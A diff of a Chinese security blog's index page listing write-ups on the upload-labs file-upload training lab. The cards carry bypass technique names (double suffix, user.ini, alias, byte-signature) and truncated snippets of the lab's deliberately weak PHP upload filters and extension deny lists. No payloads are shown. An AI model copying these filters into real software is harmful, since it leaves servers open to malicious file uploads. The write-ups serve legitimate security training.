+      <a class="index-excerpt " href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/Pass-21/" target="_self">
+        <div>
+          Pass-21123456789101112131415161718192021222324252627282930313233$is_upload = false;$msg = null;if(!empty($_FILES[&#x27;upload_file&#x27;]))&#123;    //检查MIME    $allow_type = array(&#x27;image/jpeg&#x
+        </div>
+      </a>
+
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2025-05-20 00:00" pubdate>
+              2025-05-20
+            </time>
+          </div>
+        
+        
+          <div class="post-meta mr-3 d-flex align-items-center">
+            <i class="iconfont icon-category"></i>
+            
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Web/" class="category-chain-item">Web</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="category-chain-item">文件上传</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/" class="category-chain-item">upload-labs</a>
+  
+  
+
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+          </div>
+        
+        
+          <div class="post-meta">
+            <i class="iconfont icon-tags"></i>
+            
+              <a href="/tags/Pass-21/">#Pass-21</a>
+            
+          </div>
+        
+      </div>
+    </article>
+  </div>
+
+  <div class="row mx-auto index-card">
+    
+    
+      <div class="col-12 col-md-4 m-auto index-img">
+        <a href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93%E7%BB%95%E8%BF%87/" target="_self">
+          <img src="/image/default.png" srcset="/image/loading.gif" lazyload alt="二次渲染绕过">
+        </a>
+      </div>
+    
+    <article class="col-12 col-md-8 mx-auto index-info">
+      <h2 class="index-header">
+        
+        <a href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93%E7%BB%95%E8%BF%87/" target="_self">
+          二次渲染绕过
+        </a>
+      </h2>
+
+      
+      <a class="index-excerpt " href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93%E7%BB%95%E8%BF%87/" target="_self">
+        <div>
+          二次渲染绕过12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182$is_upload = false;$msg = null;if (isse
+        </div>
+      </a>
+
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2025-05-20 00:00" pubdate>
+              2025-05-20
+            </time>
+          </div>
+        
+        
+          <div class="post-meta mr-3 d-flex align-items-center">
+            <i class="iconfont icon-category"></i>
+            
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Web/" class="category-chain-item">Web</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="category-chain-item">文件上传</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/" class="category-chain-item">upload-labs</a>
+  
+  
+
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+          </div>
+        
+        
+          <div class="post-meta">
+            <i class="iconfont icon-tags"></i>
+            
+              <a href="/tags/%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93%E7%BB%95%E8%BF%87/">#二次渲染绕过</a>
+            
+          </div>
+        
+      </div>
+    </article>
+  </div>
+
+  <div class="row mx-auto index-card">
+    
+    
+      <div class="col-12 col-md-4 m-auto index-img">
+        <a href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/%E5%88%AB%E5%90%8D%E6%94%BB%E5%87%BB/" target="_self">
+          <img src="/image/default.png" srcset="/image/loading.gif" lazyload alt="别名攻击">
+        </a>
+      </div>
+    
+    <article class="col-12 col-md-8 mx-auto index-info">
+      <h2 class="index-header">
+        
+        <a href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/%E5%88%AB%E5%90%8D%E6%94%BB%E5%87%BB/" target="_self">
+          别名攻击
+        </a>
+      </h2>
+
+      
+      <a class="index-excerpt " href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/%E5%88%AB%E5%90%8D%E6%94%BB%E5%87%BB/" target="_self">
+        <div>
+          别名攻击123456789101112131415161718192021222324252627$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123;    if (file_exists(UPLOAD_PATH)) &#123;        $deny_ext = array(&#x27;.as
+        </div>
+      </a>
+
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2025-05-20 00:00" pubdate>
+              2025-05-20
+            </time>
+          </div>
+        
+        
+          <div class="post-meta mr-3 d-flex align-items-center">
+            <i class="iconfont icon-category"></i>
+            
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Web/" class="category-chain-item">Web</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="category-chain-item">文件上传</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/" class="category-chain-item">upload-labs</a>
+  
+  
+
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+          </div>
+        
+        
+          <div class="post-meta">
+            <i class="iconfont icon-tags"></i>
+            
+              <a href="/tags/%E5%88%AB%E5%90%8D%E6%94%BB%E5%87%BB/">#别名攻击</a>
+            
+          </div>
+        
+      </div>
+    </article>
+  </div>
+
+  <div class="row mx-auto index-card">
+    
+    
+      <div class="col-12 col-md-4 m-auto index-img">
+        <a href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/user.ini/" target="_self">
+          <img src="/image/default.png" srcset="/image/loading.gif" lazyload alt="user.ini">
+        </a>
+      </div>
+    
+    <article class="col-12 col-md-8 mx-auto index-info">
+      <h2 class="index-header">
+        
+        <a href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/user.ini/" target="_self">
+          user.ini
+        </a>
+      </h2>
+
+      
+      <a class="index-excerpt " href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/user.ini/" target="_self">
+        <div>
+          user.ini1234567891011121314151617181920212223242526$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123;    if (file_exists(UPLOAD_PATH)) &#123;        $deny_ext = array(&quot;.
+        </div>
+      </a>
+
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2025-05-20 00:00" pubdate>
+              2025-05-20
+            </time>
+          </div>
+        
+        
+          <div class="post-meta mr-3 d-flex align-items-center">
+            <i class="iconfont icon-category"></i>
+            
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Web/" class="category-chain-item">Web</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="category-chain-item">文件上传</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/" class="category-chain-item">upload-labs</a>
+  
+  
+
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+          </div>
+        
+        
+          <div class="post-meta">
+            <i class="iconfont icon-tags"></i>
+            
+              <a href="/tags/user-ini/">#user.ini</a>
+            
+          </div>
+        
+      </div>
+    </article>
+  </div>
+
+  <div class="row mx-auto index-card">
+    
+    
+      <div class="col-12 col-md-4 m-auto index-img">
+        <a href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/%E5%8A%A0%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87/" target="_self">
+          <img src="/image/default.png" srcset="/image/loading.gif" lazyload alt="加空格绕过">
+        </a>
+      </div>
+    
+    <article class="col-12 col-md-8 mx-auto index-info">
+      <h2 class="index-header">
+        
+        <a href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/%E5%8A%A0%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87/" target="_self">
+          加空格绕过
+        </a>
+      </h2>
+
+      
+      <a class="index-excerpt " href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/%E5%8A%A0%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87/" target="_self">
+        <div>
+          加空格绕过1234567891011121314151617181920212223242526$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123;    if (file_exists(UPLOAD_PATH)) &#123;        $deny_ext = array(&quot;.php
+        </div>
+      </a>
+
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2025-05-20 00:00" pubdate>
+              2025-05-20
+            </time>
+          </div>
+        
+        
+          <div class="post-meta mr-3 d-flex align-items-center">
+            <i class="iconfont icon-category"></i>
+            
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Web/" class="category-chain-item">Web</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="category-chain-item">文件上传</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/" class="category-chain-item">upload-labs</a>
+  
+  
+
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+          </div>
+        
+        
+          <div class="post-meta">
+            <i class="iconfont icon-tags"></i>
+            
+              <a href="/tags/%E5%8A%A0%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87/">#加空格绕过</a>
+            
+          </div>
+        
+      </div>
+    </article>
+  </div>
+
+  <div class="row mx-auto index-card">
+    
+    
+      <div class="col-12 col-md-4 m-auto index-img">
+        <a href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/Pass-15/" target="_self">
+          <img src="/image/default.png" srcset="/image/loading.gif" lazyload alt="Pass-15">
+        </a>
+      </div>
+    
+    <article class="col-12 col-md-8 mx-auto index-info">
+      <h2 class="index-header">
+        
+        <a href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/Pass-15/" target="_self">
+          Pass-15
+        </a>
+      </h2>
+
+      
+      <a class="index-excerpt " href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/Pass-15/" target="_self">
+        <div>
+          Pass-151234567891011121314151617181920212223242526272829303132333435function isImage($filename)&#123;    //需要开启php_exif模块    $image_type = exif_imagetype($filename);    switch ($image_type) &#123;
+        </div>
+      </a>
+
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2025-05-20 00:00" pubdate>
+              2025-05-20
+            </time>
+          </div>
+        
+        
+          <div class="post-meta mr-3 d-flex align-items-center">
+            <i class="iconfont icon-category"></i>
+            
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Web/" class="category-chain-item">Web</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="category-chain-item">文件上传</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/" class="category-chain-item">upload-labs</a>
+  
+  
+
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+          </div>
+        
+        
+          <div class="post-meta">
+            <i class="iconfont icon-tags"></i>
+            
+              <a href="/tags/Pass-15/">#Pass-15</a>
+            
+          </div>
+        
+      </div>
+    </article>
+  </div>
+
+  <div class="row mx-auto index-card">
+    
+    
+      <div class="col-12 col-md-4 m-auto index-img">
+        <a href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/%E5%8F%8C%E5%86%99%E5%90%8E%E7%BC%80%E7%BB%95%E8%BF%87/" target="_self">
+          <img src="/image/default.png" srcset="/image/loading.gif" lazyload alt="双写后缀绕过">
+        </a>
+      </div>
+    
+    <article class="col-12 col-md-8 mx-auto index-info">
+      <h2 class="index-header">
+        
+        <a href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/%E5%8F%8C%E5%86%99%E5%90%8E%E7%BC%80%E7%BB%95%E8%BF%87/" target="_self">
+          双写后缀绕过
+        </a>
+      </h2>
+
+      
+      <a class="index-excerpt " href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/%E5%8F%8C%E5%86%99%E5%90%8E%E7%BC%80%E7%BB%95%E8%BF%87/" target="_self">
+        <div>
+          双写后缀绕过12345678910111213141516171819$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123;    if (file_exists(UPLOAD_PATH)) &#123;        $deny_ext = array(&quot;php&quot;,&quot;p
+        </div>
+      </a>
+
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2025-05-20 00:00" pubdate>
+              2025-05-20
+            </time>
+          </div>
+        
+        
+          <div class="post-meta mr-3 d-flex align-items-center">
+            <i class="iconfont icon-category"></i>
+            
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Web/" class="category-chain-item">Web</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="category-chain-item">文件上传</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/" class="category-chain-item">upload-labs</a>
+  
+  
+
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+          </div>
+        
+        
+          <div class="post-meta">
+            <i class="iconfont icon-tags"></i>
+            
+              <a href="/tags/%E5%8F%8C%E5%86%99%E5%90%8E%E7%BC%80%E7%BB%95%E8%BF%87/">#双写后缀绕过</a>
+            
+          </div>
+        
+      </div>
+    </article>
+  </div>
+
+  <div class="row mx-auto index-card">
+    
+    
+      <div class="col-12 col-md-4 m-auto index-img">
+        <a href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/%E5%90%8E%E7%BC%80%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/" target="_self">
+          <img src="/image/default.png" srcset="/image/loading.gif" lazyload alt="后缀绕过总结">
+        </a>
+      </div>
+    
+    <article class="col-12 col-md-8 mx-auto index-info">
+      <h2 class="index-header">
+        
+        <a href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/%E5%90%8E%E7%BC%80%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/" target="_self">
+          后缀绕过总结
+        </a>
+      </h2>
+
+      
+      <a class="index-excerpt " href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/%E5%90%8E%E7%BC%80%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/" target="_self">
+        <div>
+          后缀绕过总结12345678910111213141516171819202122232425$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123;    if (file_exists(UPLOAD_PATH)) &#123;        $deny_ext = array(&quot;php&q
+        </div>
+      </a>
+
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2025-05-20 00:00" pubdate>
+              2025-05-20
+            </time>
+          </div>
+        
+        
+          <div class="post-meta mr-3 d-flex align-items-center">
+            <i class="iconfont icon-category"></i>
+            
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Web/" class="category-chain-item">Web</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="category-chain-item">文件上传</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/" class="category-chain-item">upload-labs</a>
+  
+  
+
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+          </div>
+        
+        
+          <div class="post-meta">
+            <i class="iconfont icon-tags"></i>
+            
+              <a href="/tags/%E5%90%8E%E7%BC%80%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/">#后缀绕过总结</a>
+            
+          </div>
+        
+      </div>
+    </article>
+  </div>
+
+  <div class="row mx-auto index-card">
+    
+    
+      <div class="col-12 col-md-4 m-auto index-img">
+        <a href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/%E5%AD%97%E8%8A%82%E6%A0%87%E8%AF%86%E7%BB%95%E8%BF%87/" target="_self">
+          <img src="/image/default.png" srcset="/image/loading.gif" lazyload alt="字节标识绕过">
+        </a>
+      </div>
+    
+    <article class="col-12 col-md-8 mx-auto index-info">
+      <h2 class="index-header">
+        
+        <a href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/%E5%AD%97%E8%8A%82%E6%A0%87%E8%AF%86%E7%BB%95%E8%BF%87/" target="_self">
+          字节标识绕过
+        </a>
+      </h2>
+
+      
+      <a class="index-excerpt " href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/%E5%AD%97%E8%8A%82%E6%A0%87%E8%AF%86%E7%BB%95%E8%BF%87/" target="_self">
+        <div>
+          字节标识绕过12345678910111213141516171819202122232425262728293031323334353637383940function getReailFileType($filename)&#123;    $file = fopen($filename, &quot;rb&quot;);    $bin = fread($file, 2); //只读2字节
+        </div>
+      </a>
+
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2025-05-20 00:00" pubdate>
+              2025-05-20
+            </time>
+          </div>
+        
+        
+          <div class="post-meta mr-3 d-flex align-items-center">
+            <i class="iconfont icon-category"></i>
+            
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Web/" class="category-chain-item">Web</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="category-chain-item">文件上传</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/" class="category-chain-item">upload-labs</a>
+  
+  
+
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+          </div>
+        
+        
+          <div class="post-meta">
+            <i class="iconfont icon-tags"></i>
+            
+              <a href="/tags/%E5%AD%97%E8%8A%82%E6%A0%87%E8%AF%86%E7%BB%95%E8%BF%87/">#字节标识绕过</a>
+            
+          </div>
+        
+      </div>
+    </article>
+  </div>
+
+
+
+  <nav aria-label="navigation">
+    <span class="pagination" id="pagination">
+      <a class="extend prev" rel="prev" href="/page/5/#board"><i class="iconfont icon-arrowleft"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/#board">4</a><a class="page-number" href="/page/5/#board">5</a><span class="page-number current">6</span><a class="page-number" href="/page/7/#board">7</a><a class="page-number" href="/page/8/#board">8</a><span class="space">&hellip;</span><a class="page-number" href="/page/10/#board">10</a><a class="extend next" rel="next" href="/page/7/#board"><i class="iconfont icon-arrowright"></i></a>
+    </span>
+  </nav>
+
+
+
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
     
 
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
 
-<script src="/js/jquery-3.6.4.min.js"></script>
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="/js/jquery.min.js/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
 
 
 
   
-<script src="/fancybox/jquery.fancybox.min.js"></script>
+    <script  src="/js/img-lazyload.js" ></script>
+  
 
 
 
 
-<script src="/js/script.js"></script>
+  <script  src="/js/local-search.js" ></script>
 
 
 
 
 
-  </div>
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
 </body>
 </html>
